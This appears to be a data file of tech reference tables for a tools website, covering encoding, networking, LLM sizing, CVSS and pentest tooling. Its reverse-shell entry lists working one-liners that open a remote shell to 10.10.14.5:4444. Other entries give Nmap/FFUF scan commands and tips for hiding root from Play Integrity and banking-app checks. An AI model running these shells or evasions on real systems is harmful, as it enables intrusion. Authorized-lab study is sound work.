        col3: "Header always set Strict-Transport-Security \"max-age=63072000\"",
        col4: "header Strict-Transport-Security \"max-age=63072000\"",
        codeCol: 2,
      },
      {
        col1: "Per-IP Rate Limiting (DDoS)",
        col2: "limit_req_zone $binary_remote_addr zone=api:10m rate=15r/s;",
        col3: "mod_ratelimit / mod_evasive DOSPageCount 15",
        col4: "rate_limit { zone dynamic { key {remote_host} events 15 window 1s } }",
        codeCol: 2,
      },
      {
        col1: "Immutable Static Asset Cache",
        col2: "location ~* \\.(js|css|woff2|avif)$ { expires 365d; add_header Cache-Control \"public, immutable\"; }",
        col3: "ExpiresByType text/css \"access plus 1 year\"",
        col4: "@static path *.js *.css *.woff2 *.avif; header @static Cache-Control \"public, max-age=31536000, immutable\"",
        codeCol: 2,
      },
    ],
  },

  "video-bitrate-4k-ffmpeg-command-builder": {
    heading: "2026 Video Bitrate (1080p / 1440p / 4K60) & FFmpeg CRF Encoding Table",
    quickAnswer:
      "For visually lossless streaming and archive encoding in 2026, use Constant Rate Factor (`-crf 18–22` for `libx264`, `-crf 20–24` for `libx265`, or `-crf 24–28` for `libsvtav1`) with `-pix_fmt yuv420p` and `-movflags +faststart`. HEVC and AV1 reduce file sizes by 35%–50% at identical perceptual VMAF quality compared to H.264.",
    formulaOrSyntax: "File Size (MB) = ((Video_kbps + Audio_kbps) × Duration_Seconds) / 8192",
    benchmarks: [
      "4K60 YouTube SDR Bitrate: 53–68 Mbps (H.264) / 32–42 Mbps (HEVC/AV1)",
      "1080p60 Twitch/Kick Cap: 6,000–8,000 kbps CBR (-maxrate 8000k -bufsize 16000k)",
      "Web Fast-Seek Flag: -movflags +faststart (Moves moov atom to front)",
    ],
    headers: [
      "Resolution & Frame Rate",
      "H.264 (AVC) Bitrate",
      "HEVC (H.265) / AV1 Bitrate",
      "Recommended FFmpeg Production Flags",
    ],
    rows: [
      {
        col1: "1080p (1920×1080) @ 30fps",
        col2: "8 – 12 Mbps",
        col3: "4.5 – 7 Mbps",
        col4: "-c:v libx264 -preset slow -crf 20 -c:a aac -b:a 192k",
        codeCol: 4,
      },
      {
        col1: "1080p (1920×1080) @ 60fps",
        col2: "12 – 18 Mbps",
        col3: "7 – 10 Mbps",
        col4: "-c:v libx265 -preset medium -crf 22 -tag:v hvc1",
        codeCol: 4,
      },
      {
        col1: "1440p (2560×1440) @ 60fps",
        col2: "24 – 32 Mbps",
        col3: "14 – 20 Mbps",
        col4: "-c:v libsvtav1 -preset 6 -crf 26 -pix_fmt yuv420p10le",
        codeCol: 4,
      },
      {
        col1: "4K UHD (3840×2160) @ 30fps",
        col2: "35 – 45 Mbps",
        col3: "20 – 28 Mbps",
        col4: "-c:v libx265 -crf 20 -preset slow -movflags +faststart",
        codeCol: 4,
      },
      {
        col1: "4K UHD (3840×2160) @ 60fps HDR",
        col2: "53 – 68 Mbps",
        col3: "32 – 44 Mbps",
        col4: "-c:v hevc_nvenc -preset p6 -cq 21 -b:v 0 -pix_fmt p010le",
        codeCol: 4,
      },
      {
        col1: "Instant Stream Copy (Zero Re-encode)",
        col2: "100% Original Source",
        col3: "0% Quality Loss (Remux)",
        col4: "ffmpeg -ss 00:01:00 -to 00:05:00 -i in.mkv -c copy out.mp4",
        codeCol: 4,
      },
    ],
  },

  "anime-kdrama-binge-filler-watch-time-calculator": {
    heading: "2026 Anime & K-Drama Canon Watch-Time vs Filler Skip Benchmark Table",
    quickAnswer:
      "Skipping opening/ending themes (`~3.5 minutes` per anime episode) saves 15% of total runtime immediately, while skipping non-canon filler arcs saves 41% in Naruto Shippuden and 45% in Bleach. Watching canon episodes at `1.25x` playback speed cuts total binge hours by an additional 20%.",
    formulaOrSyntax: "Net Binge Hours = ((Total_Eps × (1 - Filler_%)) × (Ep_Minutes - OP_ED_Minutes)) / (60 × Playback_Speed)",
    benchmarks: [
      "Standard Anime Episode: 23.5 min total → ~20.0 min net canon story",
      "Big-3 Filler Averages: Bleach 45% | Naruto 41% | One Piece ~9%",
      "Standard K-Drama Season: 16 Episodes × 68 min = 18.1 Hours",
    ],
    headers: [
      "Series / Format Benchmark",
      "Total Eps & Filler Ratio",
      "Full Unedited Runtime",
      "Skip Filler + Cut OP/ED (@ 1.25x)",
    ],
    rows: [
      {
        col1: "One Piece (1,120+ Episodes)",
        col2: "1,120 Eps (~9% Filler / ~99 Eps)",
        col3: "~448 Hours (18.6 Full Days)",
        col4: "~255 Hours (Saves ~193 Hours)",
        codeCol: 4,
      },
      {
        col1: "Naruto + Shippuden (720 Eps)",
        col2: "720 Eps (~41% Filler / 295 Eps)",
        col3: "~288 Hours (12.0 Full Days)",
        col4: "~113 Hours (Saves ~175 Hours)",
        codeCol: 4,
      },
      {
        col1: "Bleach Original Run (366 Eps)",
        col2: "366 Eps (~45% Filler / 163 Eps)",
        col3: "~146 Hours (6.1 Full Days)",
        col4: "~54 Hours (Saves ~92 Hours)",
        codeCol: 4,
      },
      {
        col1: "Detective Conan (1,130+ Eps)",
        col2: "1,130 Eps (~43% Filler / 485 Eps)",
        col3: "~452 Hours (18.8 Full Days)",
        col4: "~172 Hours (Plot-Relevant Canon)",
        codeCol: 4,
      },
      {
        col1: "Standard 16-Episode K-Drama",
        col2: "16 Eps (0% Filler / 68m avg)",
        col3: "~18.1 Hours",
        col4: "~13.8 Hours (Cut Recap + 1.25x)",
        codeCol: 4,
      },
      {
        col1: "Seasonal 1-Cour Anime (12 Eps)",
        col2: "12 Eps (0% Filler / 24m avg)",
        col3: "4.8 Hours",
        col4: "3.2 Hours (20m net @ 1.25x)",
        codeCol: 4,
      },
    ],
  },

  "e164-phone-formatter-virtual-number-cost-calculator": {
    heading: "2026 ITU-T E.164 Phone Formatting Rules & Virtual DID / SMS Pricing Table",
    quickAnswer:
      "The ITU-T E.164 standard requires a leading `+`, a 1-to-3 digit country calling code, and the subscriber number with all domestic trunk prefixes (`0` in UK/India/EU) and formatting symbols stripped, up to a strict maximum of 15 digits (`^\\+[1-9]\\d{1,14}$`).",
    formulaOrSyntax: "E.164 Regex: ^\\+[1-9]\\d{1,14}$  |  Monthly Total = (DID_Count × Monthly_Lease) + (SMS_Segments × Per_Segment_Rate)",
    benchmarks: [
      "Strict E.164 Max Length: 15 digits (excluding leading + symbol)",
      "Trunk Prefix Rule: Always strip leading 0 (e.g., UK 07911 → +447911)",
      "GSM-7 vs UCS-2 SMS: 160 chars per segment (ASCII) vs 70 chars (Emoji/Unicode)",
    ],
    headers: [
      "Country / Calling Zone",
      "Local Input → Trunk Strip Rule",
      "Canonical E.164 Output",
      "2026 Virtual DID & Outbound SMS Est.",
    ],
    rows: [
      {
        col1: "United States / Canada (NANP +1)",
        col2: "(415) 555-0199 → Strip punctuation",
        col3: "+14155550199 (11 digits)",
        col4: "DID: ~$1.15/mo | SMS: ~$0.0079 + Carrier Fee",
        codeCol: 3,
      },
      {
        col1: "India (+91 DLT Regulated)",
        col2: "098765 43210 → Strip leading 0 trunk",
        col3: "+919876543210 (12 digits)",
        col4: "Domestic Route: ~$0.0035 | Int'l ILDO: ~$0.048",
        codeCol: 3,
      },
      {
        col1: "United Kingdom (+44)",
        col2: "07911 123456 → Strip leading 0 trunk",
        col3: "+447911123456 (12 digits)",
        col4: "Mobile DID: ~$1.20/mo | Outbound SMS: ~$0.042",
        codeCol: 3,
      },
      {
        col1: "Germany / Eurozone (+49)",
        col2: "01512 3456789 → Strip leading 0 trunk",
        col3: "+4915123456789 (12–13 digits)",
        col4: "Local DID: ~$1.50/mo | Outbound SMS: ~$0.075",
        codeCol: 3,
      },
      {
        col1: "Brazil (+55 Mobile 9-Digit)",
        col2: "(11) 98765-4321 → Keep area code + 9",
        col3: "+5511987654321 (13 digits)",
        col4: "DID: ~$3.50/mo | Outbound SMS: ~$0.032",
        codeCol: 3,
      },
      {
        col1: "Singapore (+65 No Trunk 0)",
        col2: "8123 4567 → Prepend +65 directly",
        col3: "+6581234567 (10 digits)",
        col4: "SGNIC Registered Sender ID Required | ~$0.039/SMS",
        codeCol: 3,
      },
    ],
  },

  "bluetooth-audio-codec-battery-latency-calculator": {
    heading: "2026 Bluetooth Audio Codec Bitrate, Latency (ms) & Battery Drain Table",
    quickAnswer:
      "Bluetooth audio codecs trade off bitrate against RF airtime and latency: Sony LDAC (990 kbps) and aptX Lossless (1,200 kbps) deliver Hi-Res/CD fidelity but increase TWS earbud battery consumption by 25%–35% and require strong 2.4GHz SNR, while Bluetooth LE Audio (LC3) cuts latency to 20–35ms at half the power draw.",
    formulaOrSyntax: "Playtime (Hours) = Earbud_mAh / (Base_DSP_mA + Radio_Tx_mA × (Codec_kbps / 328))",
    benchmarks: [
      "Competitive Gaming Threshold: < 45 ms end-to-end audio latency",
      "CD Lossless Target: 1,411 kbps uncompressed (16-bit / 44.1 kHz)",
      "LDAC 990kbps Battery Penalty: ~28% shorter runtime vs AAC 256kbps",
    ],
    headers: [
      "Bluetooth Audio Codec",
      "Max Bitrate & Sample Depth",
      "Real-World Latency (ms)",
      "TWS Battery Impact & OS Support",
    ],
    rows: [
      {
        col1: "LC3 / LC3plus (LE Audio)",
        col2: "160 – 500 kbps (24-bit / 96kHz)",
        col3: "20 – 35 ms (Ultra-Low)",
        col4: "+20% Longer Battery | Bluetooth 5.2+ / Android 14+",
        codeCol: 2,
      },
      {
        col1: "aptX Adaptive (Low-Latency Mode)",
        col2: "279 – 420 kbps Dynamic (24-bit / 96kHz)",
        col3: "50 – 80 ms",
        col4: "Low Drain | Snapdragon Sound Android Devices",
        codeCol: 2,
      },
      {
        col1: "aptX Lossless (Snapdragon Sound)",
        col2: "1,100 – 1,200 kbps (16-bit / 44.1kHz CD)",
        col3: "85 – 140 ms",
        col4: "-22% Battery Runtime | Bit-exact CD Lossless",
        codeCol: 2,
      },
      {
        col1: "LDAC (High Quality 990 kbps)",
        col2: "330 / 660 / 990 kbps (24-bit / 96kHz)",
        col3: "150 – 210 ms",
        col4: "-28% Battery Runtime | Native in Android AOSP",
        codeCol: 2,
      },
      {
        col1: "AAC (Advanced Audio Coding)",
        col2: "256 – 320 kbps (16-bit / 44.1kHz)",
        col3: "120 – 165 ms (iOS Optimized)",
        col4: "Baseline Battery (100%) | Default on iPhone/AirPods",
        codeCol: 2,
      },
      {
        col1: "SBC (Subband Baseline Codec)",
        col2: "328 kbps (SBC-XQ: 551 kbps)",
        col3: "170 – 240 ms",
        col4: "Lowest DSP Load | Universal Bluetooth A2DP Fallback",
        codeCol: 2,
      },
    ],
  },

  "local-llm-vram-calculator": {
    heading: "2026 Local LLM GPU VRAM & GGUF/EXL2 Quantization Hardware Sizing Table",
    quickAnswer:
      "To estimate GPU VRAM for running a local LLM in Ollama, llama.cpp, or vLLM, multiply the parameter count (in billions) by `bytes per parameter` (`2.0` for FP16, `1.05` for Q8_0, `0.62` for Q4_K_M), then add `1.5 GB – 4.0 GB` for the KV context cache (`8k–32k` tokens) and CUDA/Metal runtime buffers.",
    formulaOrSyntax: "Total VRAM (GB) = (Params_B × Bits_Per_Weight / 8) × 1.10 + KV_Cache_GB + 0.8GB_Buffer",
    benchmarks: [
      "Sweet-Spot Quantization: Q4_K_M or Q5_K_M (~99% FP16 perplexity recovery)",
      "KV Cache Saving: Enable FlashAttention + Q8_0 KV Cache (-ctk q8_0 -ctv q8_0)",
      "Token Speed Formula: Tokens/sec ≈ Memory_Bandwidth_GBs / Model_Size_GB",
    ],
    headers: [
      "Model Parameter Tier",
      "FP16 / BF16 VRAM",
      "Q8_0 GGUF VRAM (8k Ctx)",
      "Q4_K_M VRAM & Recommended GPU",
    ],
    rows: [
      {
        col1: "7B – 8B (Llama 3.3 8B / Qwen 2.5 7B)",
        col2: "~16.8 GB",
        col3: "~9.6 GB",
        col4: "~5.8 GB (RTX 3060 8GB / Mac M1–M4 8GB+)",
        codeCol: 4,
      },
      {
        col1: "14B (Qwen 2.5 14B / Phi-4 14B)",
        col2: "~29.5 GB",
        col3: "~16.4 GB",
        col4: "~9.8 GB (RTX 3060 12GB / RTX 4070 12GB)",
        codeCol: 4,
      },
      {
        col1: "32B (DeepSeek R1 Distill 32B / QwQ)",
        col2: "~66.0 GB",
        col3: "~36.2 GB",
        col4: "~21.2 GB (RTX 3090 / RTX 4090 / 5090 24GB+)",
        codeCol: 4,
      },
      {
        col1: "70B (Llama 3.3 70B Instruct)",
        col2: "~144.0 GB",
        col3: "~77.5 GB",
        col4: "~43.5 GB (Dual RTX 3090/4090 or Mac 64GB Unified)",
        codeCol: 4,
      },
      {
        col1: "123B (Mistral Large 2 / Command R+)",
        col2: "~250.0 GB",
        col3: "~134.0 GB",
        col4: "~74.0 GB (Mac Studio 96GB/128GB or 4x 24GB GPUs)",
        codeCol: 4,
      },
      {
        col1: "671B MoE (DeepSeek V3 / R1 Full)",
        col2: "~1,340 GB",
        col3: "~715 GB",
        col4: "~404 GB Q4_K_M (~1.58-bit Dynamic: ~165 GB)",
        codeCol: 4,
      },
    ],
  },

  "android-magisk-kernelsu-play-integrity-auditor": {
    heading: "2026 Google Play Integrity API Verdicts & Magisk / KernelSU Audit Table",
    quickAnswer:
      "Google Play Integrity API evaluates Android devices across three tiers: `MEETS_BASIC_INTEGRITY` (software environment check), `MEETS_DEVICE_INTEGRITY` (certified Android profile via Play Integrity Fix), and `MEETS_STRONG_INTEGRITY` (hardware-backed TEE Key Attestation verifying an untouched locked bootloader or valid non-revoked OEM keybox).",
    formulaOrSyntax: "Verdict Tiers: BASIC_INTEGRITY → DEVICE_INTEGRITY (Google Pay/Wallet) → STRONG_INTEGRITY (Hardware Keybox)",
    benchmarks: [
      "Google Wallet Requirement: MEETS_DEVICE_INTEGRITY (Hardware-backed)",
      "Kernel-Level Root Advantage: KernelSU / APatch mount via OverlayFS/Magic Mount",
      "Zygisk Detection Vector: /proc/self/mountinfo & ptrace injection traces",
    ],
    headers: [
      "Play Integrity Verdict / Vector",
      "Hardware / OS Attestation Check",
      "Root / Custom ROM Impact",
      "Remediation / Hardening Architecture",
    ],
    rows: [
      {
        col1: "MEETS_BASIC_INTEGRITY",
        col2: "Software-level SafetyNet successor check",
        col3: "Fails if su binary or test-keys ro.build.tags exposed",
        col4: "Enable Zygisk Denylist / Shamiko or KernelSU Unmount",
        codeCol: 1,
      },
      {
        col1: "MEETS_DEVICE_INTEGRITY",
        col2: "Play Protect certified fingerprint + DroidGuard check",
        col3: "Required by Google Wallet, NFC tap-to-pay & banking apps",
        col4: "Requires PlayIntegrityFix (PIF) valid certified print",
        codeCol: 1,
      },
      {
        col1: "MEETS_STRONG_INTEGRITY",
        col2: "Hardware TEE / StrongBox KeyMaster certificate chain",
        col3: "Fails whenever bootloader is unlocked ( VerifiedBoot = Orange )",
        col4: "Relock bootloader on stock signed ROM or TrickyStore",
        codeCol: 1,
      },
      {
        col1: "Zygisk & /proc/mounts Leak",
        col2: "Apps scan /proc/self/mounts for magisk/overlayfs strings",
        col3: "Triggers RASP (LIAPP / Promon / DexGuard) crash",
        col4: "Use KernelSU SusFS or Zygisk Assistant + Shamiko",
        codeCol: 2,
      },
      {
        col1: "ADB & Developer Options Check",
        col2: "Settings.Global.ADB_ENABLED == 1 detection",
        col3: "Fintech & UPI apps block login when USB Debug is ON",
        col4: "Turn off USB Debugging & hide mock location providers",
        codeCol: 2,
      },
      {
        col1: "Package Manager App List Scan",
        col2: "Queries installed packages for Magisk/LSPosed/Root apps",
        col3: "Detects default com.topjohnwu.magisk package name",
        col4: "Repackage manager with random stub + Hidemyapplist",
        codeCol: 3,
      },
    ],
  },

  "nmap-command-builder": {
    heading: "2026 Nmap & FFUF Penetration Testing CLI Cheat Sheet & Flag Reference",
    quickAnswer:
      "For fast, accurate authorized penetration testing reconnaissance, run a two-stage Nmap workflow: first sweep all 65,535 TCP ports at high packet rate (`sudo nmap -sS -p- -T4 --min-rate 1500 -Pn <target>`), then run targeted version and NSE script enumeration (`-sV -sC -O -oA recon`) strictly on the discovered open ports.",
    formulaOrSyntax: "sudo nmap -sS -sV -sC -O -Pn -p- -T4 --min-rate 1500 -oA full_audit <target_ip>",
    benchmarks: [
      "Stealth Half-Open Scan: -sS (Sends SYN → RST, never completes handshake)",
      "Firewall Ping Bypass: -Pn (Skips ICMP echo discovery on cloud targets)",
      "FFUF False-Positive Filter: -mc 200,301,302,403 -fs <default_404_bytes>",
    ],
    headers: [
      "Reconnaissance Profile",
      "Copy-Ready Nmap / FFUF CLI Command",
      "Socket / Root Requirement",
      "Use Case & IDS Footprint",
    ],
    rows: [
      {
        col1: "Stealth SYN Top 1,000 Ports",
        col2: "sudo nmap -sS -Pn -T4 --open -oN syn_top1k.txt <target>",
        col3: "Root / Raw Socket",
        col4: "Fast perimeter mapping; avoids full TCP connect logs",
        codeCol: 2,
      },
      {
        col1: "All 65,535 TCP Ports Turbo Sweep",
        col2: "sudo nmap -sS -p- -T4 --min-rate 2000 -Pn -oG all_ports.gnmap <target>",
        col3: "Root / Raw Socket",
        col4: "Finds non-standard high ports in HTB / OSCP labs",
        codeCol: 2,
      },
      {
        col1: "Service Version + Default NSE",
        col2: "sudo nmap -sV -sC -O -p 22,80,443,445,3389 -oA service_audit <target>",
        col3: "Root (-O) / User (-sV)",
        col4: "Fingerprints daemon versions, TLS certs & OS kernel",
        codeCol: 2,
      },
      {
        col1: "NSE Vulnerability & CVE Audit",
        col2: "sudo nmap -sV --script \"vuln and safe\" -p 80,443,445,8080 <target>",
        col3: "User / Root",
        col4: "Checks SMB, HTTP, SSL & known CVE signatures safely",
        codeCol: 2,
      },
      {
        col1: "Top 100 UDP Infrastructure Scan",
        col2: "sudo nmap -sU --top-ports 100 --version-intensity 0 -T4 <target>",
        col3: "Root Required",
        col4: "Audits DNS (53), SNMP (161), NTP (123) & WireGuard",
        codeCol: 2,
      },
      {
        col1: "FFUF Web Directory & VHost Fuzz",
        col2: "ffuf -u https://target.com/FUZZ -w common.txt -mc 200,301,302,403 -t 50",
        col3: "Standard User",
        col4: "High-speed HTTP endpoint & virtual host enumeration",
        codeCol: 2,
      },
    ],
  },

  "wireguard-vpn-config-split-tunnel-builder": {
    heading: "2026 WireGuard Split-Tunnel AllowedIPs, MTU & PostUp Routing Table",
    quickAnswer:
      "In WireGuard (`wg0.conf`), the client `[Peer] AllowedIPs` directive acts as both a routing table selector and an ingress source-IP filter: set `AllowedIPs = 0.0.0.0/0, ::/0` for a full-tunnel VPN, or specify internal CIDRs (`10.8.0.0/24, 192.168.1.0/24`) for split tunneling where internet traffic bypasses the VPN.",
    formulaOrSyntax: "WireGuard Overhead = 60B (IPv4) or 80B (IPv6) → Optimal Ethernet MTU = 1420 (PPPoE/LTE MTU = 1380)",
    benchmarks: [
      "Full Tunnel Routing: AllowedIPs = 0.0.0.0/0, ::/0",
      "Optimal WireGuard MTU: 1420 bytes (1500 Ethernet - 80B IPv6 WG header)",
      "NAT Traversal Keepalive: PersistentKeepalive = 25 (Seconds)",
    ],
    headers: [
      "WireGuard Routing Scenario",
      "Config Directive / CIDR Value",
      "Traffic Flow Behavior",
      "Operational & Security Best Practice",
    ],
    rows: [
      {
        col1: "Full Tunnel VPN (All Traffic)",
        col2: "AllowedIPs = 0.0.0.0/0, ::/0",
        col3: "Routes 100% of IPv4 & IPv6 packets via WG server",
        col4: "Pair with DNS = 1.1.1.1 to prevent ISP DNS leaks",
        codeCol: 2,
      },
      {
        col1: "Corporate / Homelab Split Tunnel",
        col2: "AllowedIPs = 10.66.66.0/24, 192.168.10.0/24",
        col3: "Only private subnet traffic enters encrypted tunnel",
        col4: "Direct internet speed remains untouched (zero VPN lag)",
        codeCol: 2,
      },
      {
        col1: "Full Tunnel Excluding Local LAN",
        col2: "AllowedIPs = 0.0.0.0/1, 128.0.0.0/1 (plus LAN bypass)",
        col3: "Routes internet via VPN while keeping local printers/NAS",
        col4: "Avoids 0.0.0.0/0 kill-switch overriding local subnet",
        codeCol: 2,
      },
      {
        col1: "MTU Fragmentation & MSS Fix",
        col2: "MTU = 1420  (or MTU = 1380 on 5G/PPPoE)",
        col3: "Prevents PMTUD blackholes on TLS handshakes",
        col4: "Use 1380 if websites hang or video streams stall",
        codeCol: 2,
      },
      {
        col1: "Server NAT Masquerade (PostUp)",
        col2: "PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE",
        col3: "Enables IPv4 packet forwarding out server NIC",
        col4: "Requires net.ipv4.ip_forward=1 in /etc/sysctl.conf",
        codeCol: 2,
      },
      {
        col1: "Post-Quantum PSK & CGNAT Keepalive",
        col2: "PresharedKey = <wg genpsk> | PersistentKeepalive = 25",
        col3: "Adds 256-bit symmetric layer + keeps NAT port open",
        col4: "Defends Curve25519 against harvest-now-decrypt-later",
        codeCol: 2,
      },
    ],
  },

  "ai-api-token-cost-calculator": {
    heading: "2026 LLM API Token Pricing, Context Caching & Word-to-Token Benchmark Table",
    quickAnswer:
      "In English prose and source code, `1,000 tokens` equals approximately `750 words` (`1 token ≈ 0.75 words` or `4 characters`). In 2026, enabling Prompt Context Caching reduces repeated system prompt and RAG document input token costs by 50%–90%, while async Batch APIs cut both input and output costs by 50%.",
    formulaOrSyntax: "Monthly API Cost ($) = ((Input_Tokens × Input_Rate) + (Cached_Tokens × Cache_Rate) + (Output_Tokens × Output_Rate)) / 1,000,000",
    benchmarks: [
      "Token Conversion Rule: 1M Tokens ≈ 750,000 English words (~1,500 pages)",
      "Prompt Caching Discount: 50% to 90% off repeated prefix tokens",
      "Batch Async API Discount: 50% off standard synchronous rates (24h SLA)",
    ],
    headers: [
      "2026 Frontier / Flash Model Tier",
      "Input Cost / 1M Tokens",
      "Cached Input / 1M Tokens",
      "Output Cost / 1M & Context Window",
    ],
    rows: [
      {
        col1: "OpenAI GPT-4o (Multimodal Flagship)",
        col2: "$2.50 / 1M",
        col3: "$1.25 / 1M (50% Auto-Cache)",
        col4: "$10.00 / 1M (128k Context Window)",
        codeCol: 2,
      },
      {
        col1: "OpenAI GPT-4o mini (High-Volume)",
        col2: "$0.15 / 1M",
        col3: "$0.075 / 1M (50% Auto-Cache)",
        col4: "$0.60 / 1M (128k Context Window)",
        codeCol: 2,
      },
      {
        col1: "Anthropic Claude 3.7 Sonnet",
        col2: "$3.00 / 1M",
        col3: "$0.30 / 1M (90% Cache Read)",
        col4: "$15.00 / 1M (200k Context + Thinking)",
        codeCol: 2,
      },
      {
        col1: "Google Gemini 2.5 Pro",
        col2: "$1.25 / 1M (≤200k)",
        col3: "$0.31 / 1M (Context Cache)",
        col4: "$10.00 / 1M (Up to 2M Token Context)",
        codeCol: 2,
      },
      {
        col1: "Google Gemini 2.5 Flash",
        col2: "$0.15 / 1M",
        col3: "$0.0375 / 1M (75% Cache Save)",
        col4: "$0.60 / 1M (1M Token Context Window)",
        codeCol: 2,
      },
      {
        col1: "DeepSeek V3 / R1 (Open-Weight API)",
        col2: "$0.27 – $0.55 / 1M",
        col3: "$0.07 – $0.14 / 1M (Disk Cache)",
        col4: "$1.10 – $2.19 / 1M (64k–128k Context)",
        codeCol: 2,
      },
    ],
  },

  "cvss-v4-vulnerability-score-calculator": {
    heading: "2026 CVSS v4.0 Severity Scoring, Vector Metrics & Patch SLA Reference Table",
    quickAnswer:
      "CVSS v4.0 (FIRST.org standard) replaces CVSS v3.1's ambiguous `Scope (S:U/C)` metric with explicit Vulnerable System (`VC/VI/VA`) and Subsequent System (`SC/SI/SA`) impact metrics, introduces `Attack Requirements (AT:N/P)` to replace `User Interaction` nuance, and encourages reporting combined Base + Threat (`CVSS-BT`) scores.",
    formulaOrSyntax: "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N  →  Score: 9.3 (Critical)",
    benchmarks: [
      "Critical SLA: 9.0–10.0 (Remediate within 24–72 hours if E:A exploited)",
      "Scope Replacement: Vulnerable (VC/VI/VA) vs Subsequent (SC/SI/SA) impact",
      "Threat Metric Impact: E:U (Unreported) can reduce High vectors by 1.5+ points",
    ],
    headers: [
      "CVSS v4.0 Rating / Metric",
      "Score Range / Vector Values",
      "v4.0 Architectural Change vs v3.1",
      "Enterprise Remediation SLA",
    ],
    rows: [
      {
        col1: "Critical Severity",
        col2: "9.0 – 10.0 (e.g., AV:N/AC:L/AT:N/PR:N)",
        col3: "Unauthenticated network RCE or auth bypass",
        col4: "Emergency Patch: 24 – 72 Hours",
        codeCol: 2,
      },
      {
        col1: "High Severity",
        col2: "7.0 – 8.9 (e.g., AV:N/AC:L/AT:P/PR:L)",
        col3: "Privilege escalation or high-impact data leak",
        col4: "Priority Patch: 7 – 14 Days",
        codeCol: 2,
      },
      {
        col1: "Medium Severity",
        col2: "4.0 – 6.9 (e.g., AV:N/AC:L/AT:N/UI:A)",
        col3: "Reflected XSS, CSRF, or limited info disclosure",
        col4: "Scheduled Release: 30 – 60 Days",
        codeCol: 2,
      },
      {
        col1: "Attack Requirements (AT)",
        col2: "AT:N (None) vs AT:P (Present)",
        col3: "Separates race conditions/MITM prereqs from AC",
        col4: "AT:P lowers score when exploit depends on timing",
        codeCol: 2,
      },
      {
        col1: "Subsequent System CIA (SC/SI/SA)",
        col2: "SC:H / SI:H / SA:H (Downstream Impact)",
        col3: "Replaces binary Scope:Changed (S:C) from v3.1",
        col4: "Models lateral movement to hypervisor or DB",
        codeCol: 2,
      },
      {
        col1: "Exploit Maturity (Threat E)",
        col2: "E:A (Attacked) | E:P (PoC) | E:U (Unreported)",
        col3: "Produces official CVSS-BT nomenclature score",
        col4: "Prioritize E:A (CISA KEV) over theoretical E:U",
        codeCol: 2,
      },
    ],
  },

  "reverse-shell-command-generator": {
    heading: "2026 Authorized Reverse Shell One-Liner & Interactive PTY Stabilization Table",
    quickAnswer:
      "During authorized penetration tests and OSCP/HTB labs, start a listener (`nc -lvnp 4444` or `rlwrap nc -lvnp 4444`), execute a runtime-matched outbound shell payload (Bash `/dev/tcp`, Python3 `pty.spawn`, or OpenBSD `mkfifo`), and immediately upgrade the raw socket to a full interactive TTY so `Ctrl+C`, tab-completion, and `sudo` work cleanly.",
    formulaOrSyntax: "PTY Upgrade: python3 -c 'import pty;pty.spawn(\"/bin/bash\")' → Ctrl+Z → stty raw -echo; fg → export TERM=xterm-256color",
    benchmarks: [
      "Listener Command: rlwrap -cAr nc -lvnp 4444",
      "Firewall-Friendly Port: 443 (HTTPS) or 53 (DNS) outbound TCP",
      "TTY Stabilization: stty rows 42 cols 160 && export TERM=xterm",
    ],
    headers: [
      "Target Runtime",
      "Authorized Reverse Shell One-Liner",
      "Binary / Socket Dependency",
      "Operational Lab Note",
    ],
    rows: [
      {
        col1: "Bash Built-in (/dev/tcp)",
        col2: "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'",
        col3: "GNU Bash (No external binary)",
        col4: "Wrap in bash -c '...' if parent shell is /bin/sh",
        codeCol: 2,
      },
      {
        col1: "Netcat OpenBSD (mkfifo Pipe)",
        col2: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f",
        col3: "nc (Works without -e flag)",
        col4: "Most reliable Netcat payload on modern Ubuntu/Debian",
        codeCol: 2,
      },
      {
        col1: "Python 3 Socket + Native PTY",
        col2: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.5\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
        col3: "python3 standard library",
        col4: "Spawns a pseudo-terminal immediately upon connect",
        codeCol: 2,
      },
      {
        col1: "PHP CLI / Web RCE (fsockopen)",
        col2: "php -r '$s=fsockopen(\"10.10.14.5\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        col3: "php-cli (FD #3 stream)",
        col4: "Use proc_open() if exec/system are in disable_functions",
        codeCol: 2,
      },
      {
        col1: "PowerShell TCPClient Stream",
        col2: "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};...",
        col3: "powershell.exe / pwsh",
        col4: "Encode as UTF-16LE Base64 for powershell -enc",
        codeCol: 2,
      },
      {
        col1: "Interactive TTY Upgrade Sequence",
        col2: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ; stty raw -echo; fg",
        col3: "Host Terminal + Python/Script",
        col4: "Prevents accidental Ctrl+C from killing your shell",
        codeCol: 2,
      },
    ],
  },

  "tcp-flag-port-scan-handshake-visualizer": {
    heading: "2026 RFC 9293 TCP Control Flags, Hex Bitmasks & Nmap Port State Table",
    quickAnswer:
      "The 8-bit TCP control flag byte (`CWR=0x80`, `ECE=0x40`, `URG=0x20`, `ACK=0x10`, `PSH=0x08`, `RST=0x04`, `SYN=0x02`, `FIN=0x01`) governs connection state transitions and port scan responses: an open port replies `SYN+ACK (0x12)` to a `SYN (0x02)` probe, a closed port replies `RST+ACK (0x14)`, and a stateful firewall drops the packet silently.",
    formulaOrSyntax: "Flag Byte Formula: CWR(128) + ECE(64) + URG(32) + ACK(16) + PSH(8) + RST(4) + SYN(2) + FIN(1)  |  SYN+ACK = 2 + 16 = 18 (0x12)",
    benchmarks: [
      "SYN Packet Byte: tcp[13] == 0x02 (Decimal 2)",
      "SYN-ACK Packet Byte: tcp[13] == 0x12 (Decimal 18)",
      "Xmas Scan Byte (FIN+PSH+URG): tcp[13] == 0x29 (Decimal 41)",
    ],
    headers: [
      "TCP Flag / Scan Probe",
      "Hex & Decimal Bitmask",
      "Open Port Target Response",
      "Closed vs Filtered Firewall Response",
    ],
    rows: [
      {
        col1: "SYN (3-Way Handshake / -sS)",
        col2: "0x02 (Decimal 2 | tcp-syn)",
        col3: "SYN+ACK (0x12) → Scanner sends RST (0x04)",
